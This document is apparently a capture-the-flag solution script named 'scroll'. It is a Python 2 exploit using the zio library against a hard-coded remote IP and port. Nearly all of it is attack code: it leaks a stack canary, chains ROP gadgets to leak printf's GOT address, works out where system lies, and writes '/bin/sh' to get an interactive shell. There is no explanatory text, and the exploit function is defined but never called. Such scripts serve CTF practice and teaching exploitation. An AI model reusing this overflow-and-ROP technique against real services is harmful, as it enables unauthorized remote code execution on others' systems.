# scroll
滚动条

#!/usr/bin/python
from zio import *
import struct
target = ('106.75.66.195', 20000)
#target= ('127.0.0.1',10000)
 
def exp(target):
    io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), print_write=COLORED(RAW, 'green'))
    c=raw_input('go1?')
    io.read_until('Who are you?\n')
    payload='A'*68+'MARK\n'
    io.write(payload)
    io.read_until('MARK')
    cookie = l64(io.read(8))-0x0a
    print hex(cookie)
    c=raw_input('go2?')
    payload ='A'*68+'MARK'+l64(cookie)
    payload+=l64(0x0000000000000000)#rbp
    payload+=l64(0x04007EA)   #pop rbx|0,rbp|1,r12|func,r13|rdx,r14|rsi,r15|edi  
    payload+=l64(0x0)
    payload+=l64(0x1)
    payload+=l64(0x601028)  #printf_got
    payload+=l64(0x0)   
    payload+=l64(0x0)
    payload+=l64(0x601030)
    payload+=l64(0x4007D0)
    payload+='1'*0x38
    payload+=l64(0x4006C6)   #main
     
    io.write(payload)
     
    test=io.read_until('\x7f')
    test=test[-6:]+'\x00'*2
    read=struct.unpack("<Q",test)[0]
    print hex(read)
    system=read-0xa60a0
###############################################################3
    io.read_until('Who are you?\n')
    payload='A'*68+'MARK\n'
    io.write(payload)
    io.read_until('MARK')
    cookie = l64(io.read(8))-0x0a
    print hex(cookie)
    c=raw_input('go2?')
    payload ='A'*68+'MARK'+l64(cookie)
    payload+=l64(0x0000000000000000)#rbp
    payload+=l64(0x04007EA)   #pop rbx|0,rbp|1,r12|func,r13|rdx,r14|rsi,r15|edi  
    payload+=l64(0x0)
    payload+=l64(0x1)
    payload+=l64(0x601030)  #read_got
    payload+=l64(0x10)   
    payload+=l64(0x601b00)
    payload+=l64(0x0)
    payload+=l64(0x4007D0)
    payload+='1'*0x38
    payload+=l64(0x4006C6)   #main
    io.write(payload)
    c=raw_input('go2?')
    io.write('/bin/sh'+'\x00'+l64(system))
#####################################################################
    io.read_until('Who are you?\n')
    payload='A'*68+'MARK\n'
    io.write(payload)
    io.read_until('MARK')
    cookie = l64(io.read(8))-0x0a
    print hex(cookie)
    c=raw_input('go2?')
    payload ='A'*68+'MARK'+l64(cookie)
    payload+=l64(0x0000000000000000)#rbp
    payload+=l64(0x04007EA)   #pop rbx|0,rbp|1,r12|func,r13|rdx,r14|rsi,r15|edi  
    payload+=l64(0x0)
    payload+=l64(0x1)
    payload+=l64(0x601b08)  #read_got
    payload+=l64(0x0)   
    payload+=l64(0x0)
    payload+=l64(0x601b00)
    payload+=l64(0x4007D0)
    payload+='1'*0x38
    payload+=l64(0x4006C6)   #main
    io.write(payload)
io.interact()
